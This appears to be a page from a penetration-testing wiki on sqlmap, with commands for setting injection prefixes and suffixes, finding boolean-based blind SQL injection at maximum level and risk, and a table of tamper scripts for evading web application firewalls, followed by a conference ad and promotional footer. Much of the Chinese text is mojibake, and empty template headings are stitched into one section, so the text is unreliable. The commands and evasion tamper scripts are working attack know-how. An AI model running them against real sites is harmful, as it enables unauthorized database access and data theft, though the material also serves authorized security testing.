### è®¾ç½®åç¼€
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### å‰ç¼€

---

### Description

æè¿°

---

### Usage

ç”¨æ³•

---

### Options

é€‰é¡¹

---

### Examples

ç¤ºä¾‹

---

### References

å‚è€ƒèµ„æ–™
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### å¸®åŠ©å¯»æ‰¾å¸ƒå°”æ³¨å…¥

Boolean-based SQL injection is a technique used to exploit vulnerabilities in web applications that do not properly sanitize user input before constructing SQL queries. By injecting carefully crafted boolean expressions into the input fields, an attacker can manipulate the behavior of the application and extract sensitive information from the database.

To identify boolean-based SQL injection vulnerabilities, you can use tools like SQLMap. SQLMap is a powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

Here are the steps to find boolean injection using SQLMap:

1. **Identify the target**: Determine the URL of the vulnerable web application that you want to test for boolean-based SQL injection.

2. **Launch SQLMap**: Open a terminal and run SQLMap with the appropriate command-line options. For example:
   ```
   sqlmap -u <target_url> --level=5 --risk=3 --technique=B
   ```

   - The `-u` option specifies the target URL.
   - The `--level` option sets the level of tests to be performed (5 is the highest).
   - The `--risk` option sets the risk level of tests to be performed (3 is the highest).
   - The `--technique` option specifies the injection technique to be used (B for boolean-based).

3. **Analyze the results**: SQLMap will automatically analyze the target URL for boolean-based SQL injection vulnerabilities. It will send various payloads and analyze the responses to determine if the application is vulnerable.

4. **Exploit the vulnerability**: If SQLMap identifies a boolean-based SQL injection vulnerability, it can automatically exploit it to extract data from the database. You can specify additional options to customize the exploitation process.

By following these steps, you can effectively identify and exploit boolean-based SQL injection vulnerabilities in web applications. However, it is important to note that you should only perform these activities on systems that you have proper authorization to test.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### ç¯¡æ”¹

è®°ä½**ä½ å¯ä»¥è‡ªå·±åœ¨Pythonä¸­åˆ›å»ºç¯¡æ”¹å™¨**ï¼Œè€Œä¸”éå¸¸ç®€å•ã€‚ä½ å¯ä»¥åœ¨[äºŒæ¬¡æ³¨å…¥é¡µé¢](second-order-injection-sqlmap.md)ä¸­æ‰¾åˆ°ä¸€ä¸ªç¯¡æ”¹å™¨ç¤ºä¾‹ã€‚
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | æè¿°                                                                                                                               |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | å°†æ’‡å·å­—ç¬¦æ›¿æ¢ä¸ºå…¶UTF-8å…¨è§’å¯¹åº”å­—ç¬¦                                                                                                 |
| apostrophenullencode.py      | å°†æ’‡å·å­—ç¬¦æ›¿æ¢ä¸ºå…¶éæ³•çš„åŒUnicodeå¯¹åº”å­—ç¬¦                                                                                           |
| appendnullbyte.py            | åœ¨è´Ÿè½½æœ«å°¾é™„åŠ ç¼–ç çš„NULLå­—èŠ‚å­—ç¬¦                                                                                                   |
| base64encode.py              | å¯¹ç»™å®šè´Ÿè½½ä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡ŒBase64ç¼–ç                                                                                                |
| between.py                   | å°†å¤§äºè¿ç®—ç¬¦ï¼ˆ'>'ï¼‰æ›¿æ¢ä¸º'NOT BETWEEN 0 AND #'                                                                                     |
| bluecoat.py                  | åœ¨SQLè¯­å¥åé¢çš„ç©ºæ ¼å­—ç¬¦åæ›¿æ¢ä¸ºæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦ã€‚ç„¶åå°†å­—ç¬¦'='æ›¿æ¢ä¸ºLIKEè¿ç®—ç¬¦                                                      |
| chardoubleencode.py          | å¯¹ç»™å®šè´Ÿè½½ä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡ŒåŒURLç¼–ç ï¼ˆä¸å¤„ç†å·²ç¼–ç çš„å­—ç¬¦ï¼‰                                                                             |
| commalesslimit.py            | å°†ç±»ä¼¼'LIMIT M, N'çš„å®ä¾‹æ›¿æ¢ä¸º'LIMIT N OFFSET M'                                                                                    |
| commalessmid.py              | å°†ç±»ä¼¼'MID(A, B, C)'çš„å®ä¾‹æ›¿æ¢ä¸º'MID(A FROM B FOR C)'                                                                                |
| concat2concatws.py           | å°†ç±»ä¼¼'CONCAT(A, B)'çš„å®ä¾‹æ›¿æ¢ä¸º'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                                 |
| charencode.py                | å¯¹ç»™å®šè´Ÿè½½ä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼ˆä¸å¤„ç†å·²ç¼–ç çš„å­—ç¬¦ï¼‰                                                                               |
| charunicodeencode.py         | å¯¹ç»™å®šè´Ÿè½½ä¸­çš„æœªç¼–ç å­—ç¬¦è¿›è¡ŒUnicode URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç¼–ç çš„å­—ç¬¦ï¼‰ã€‚"%u0022"                                                          |
| charunicodeescape.py         | å¯¹ç»™å®šè´Ÿè½½ä¸­çš„æœªç¼–ç å­—ç¬¦è¿›è¡ŒUnicode URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç¼–ç çš„å­—ç¬¦ï¼‰ã€‚"\u0022"                                                          |
| equaltolike.py               | å°†æ‰€æœ‰ç­‰äºè¿ç®—ç¬¦ï¼ˆ'='ï¼‰çš„å‡ºç°æ›¿æ¢ä¸ºLIKEè¿ç®—ç¬¦                                                                                       |
| escapequotes.py              | æ–œæ è½¬ä¹‰å¼•å·ï¼ˆ'å’Œ"ï¼‰                                                                                                               |
| greatest.py                  | å°†å¤§äºè¿ç®—ç¬¦ï¼ˆ'>'ï¼‰æ›¿æ¢ä¸º'GREATEST'å¯¹åº”å­—ç¬¦                                                                                        |
| halfversionedmorekeywords.py | åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ æœ‰ç‰ˆæœ¬çš„MySQLæ³¨é‡Š                                                                                               |
| ifnull2ifisnull.py           | å°†ç±»ä¼¼'IFNULL(A, B)'çš„å®ä¾‹æ›¿æ¢ä¸º'IF(ISNULL(A), B, A)'                                                                                |
| modsecurityversioned.py      | ä½¿ç”¨æœ‰ç‰ˆæœ¬çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´æŸ¥è¯¢                                                                                                         |
| modsecurityzeroversioned.py  | ä½¿ç”¨é›¶ç‰ˆæœ¬çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´æŸ¥è¯¢                                                                                                         |
| multiplespaces.py            | åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼                                                                                                         |
| nonrecursivereplacement.py   | å°†é¢„å®šä¹‰çš„SQLå…³é”®å­—æ›¿æ¢ä¸ºé€‚åˆæ›¿æ¢çš„è¡¨ç¤ºå½¢å¼ï¼ˆä¾‹å¦‚.replace("SELECT", ""))è¿‡æ»¤å™¨                                                       |
| percentage.py                | åœ¨æ¯ä¸ªå­—ç¬¦å‰é¢æ·»åŠ ç™¾åˆ†å·ï¼ˆ'%'ï¼‰                                                                                                     |
| overlongutf8.py              | è½¬æ¢ç»™å®šè´Ÿè½½ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼ˆä¸å¤„ç†å·²ç¼–ç çš„å­—ç¬¦ï¼‰                                                                                       |
| randomcase.py                | å°†æ¯ä¸ªå…³é”®å­—å­—ç¬¦æ›¿æ¢ä¸ºéšæœºå¤§å°å†™å€¼                                                                                                 |
| randomcomments.py            | å‘SQLå…³é”®å­—æ·»åŠ éšæœºæ³¨é‡Š                                                                                                             |
| securesphere.py              | è¿½åŠ ç‰¹æ®Šåˆ¶ä½œçš„å­—ç¬¦ä¸²                                                                                                               |
| sp\_password.py              | åœ¨è´Ÿè½½æœ«å°¾è¿½åŠ 'sp\_password'ä»¥è‡ªåŠ¨æ··æ·†DBMSæ—¥å¿—                                                                                      |
| space2comment.py             | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºæ³¨é‡Š                                                                                                         |
| space2dash.py                | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºç ´æŠ˜å·æ³¨é‡Šï¼ˆ'--'ï¼‰ï¼Œåè·Ÿéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ï¼ˆ'\n'ï¼‰                                                               |
| space2hash.py                | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºäº•å·å­—ç¬¦ï¼ˆ'#'ï¼‰ï¼Œåè·Ÿéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ï¼ˆ'\n'ï¼‰                                                                 |
| space2morehash.py            | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºäº•å·å­—ç¬¦ï¼ˆ'#'ï¼‰ï¼Œåè·Ÿéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ï¼ˆ'\n'ï¼‰                                                                 |
| space2mssqlblank.py          | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºæ¥è‡ªæœ‰æ•ˆå¤‡é€‰å­—ç¬¦é›†çš„éšæœºç©ºç™½å­—ç¬¦                                                                               |
| space2mssqlhash.py           | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºäº•å·å­—ç¬¦ï¼ˆ'#'ï¼‰ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼ˆ'\n'ï¼‰                                                                             |
| space2mysqlblank.py          | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºæ¥è‡ªæœ‰æ•ˆå¤‡é€‰å­—ç¬¦é›†çš„éšæœºç©ºç™½å­—ç¬¦                                                                               |
| space2mysqldash.py           | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºç ´æŠ˜å·æ³¨é‡Šï¼ˆ'--'ï¼‰ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼ˆ'\n'ï¼‰                                                                           |
| space2plus.py                | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºåŠ å·ï¼ˆ'+'ï¼‰                                                                                                   |
| space2randomblank.py         | å°†ç©ºæ ¼å­—ç¬¦ï¼ˆ' 'ï¼‰æ›¿æ¢ä¸ºæ¥è‡ªæœ‰æ•ˆå¤‡é€‰å­—ç¬¦é›†çš„éšæœºç©ºç™½å­—ç¬¦                                                                               |
| symboliclogical.py           | å°†ANDå’ŒORé€»è¾‘è¿ç®—ç¬¦æ›¿æ¢ä¸ºå…¶ç¬¦å·å¯¹åº”å­—ç¬¦ï¼ˆ&&å’Œ\|\|ï¼‰                                                                                  |
| unionalltounion.py           | å°†UNION ALL SELECTæ›¿æ¢ä¸ºUNION SELECT                                                                                                |
| unmagicquotes.py             | å°†å¼•å·å­—ç¬¦ï¼ˆ'ï¼‰æ›¿æ¢ä¸ºå¤šå­—èŠ‚ç»„åˆ%bf%27ï¼Œåè·Ÿé€šç”¨æ³¨é‡Šï¼ˆä½¿å…¶èµ·ä½œç”¨ï¼‰                                                                     |
| uppercase.py                 | å°†æ¯ä¸ªå…³é”®å­—å­—ç¬¦æ›¿æ¢ä¸ºå¤§å†™å€¼'INSERT'                                                                                                |
| varnish.py                   | è¿½åŠ HTTPå¤´'X-originating-IP'                                                                                                       |
| versionedkeywords.py         | ä½¿ç”¨æœ‰ç‰ˆæœ¬çš„MySQLæ³¨é‡Šæ‹¬èµ·æ¯ä¸ªéå‡½æ•°å…³é”®å­—                                                                                            |
| versionedmorekeywords.py     | ä½¿ç”¨æœ‰ç‰ˆæœ¬çš„MySQLæ³¨é‡Šæ‹¬èµ·æ¯ä¸ªå…³é”®å­—                                                                                                |
| xforwardedfor.py             | è¿½åŠ ä¼ªé€ çš„HTTPå¤´'X-Forwarded-For'                                                                                                  |

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con mÃ¡s de una dÃ©cada que se celebrarÃ¡ el 7 y 8 de septiembre de 2023 en BogotÃ¡, Colombia. Es un evento de gran contenido tÃ©cnico donde se presentan las Ãºltimas investigaciones en espaÃ±ol que atrae a hackers e investigadores de todo el mundo.\
Â¡RegÃ­strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **åŠ å…¥** [ğŸ’¬](https://emojipedia.org/speech-balloon/) [Discord ç¾¤ç»„](https://discord.gg/hRep4RUj7f) æˆ– [Telegram ç¾¤ç»„](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** [ğŸ¦](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[@carlospolopm](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) **å’Œ** [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**
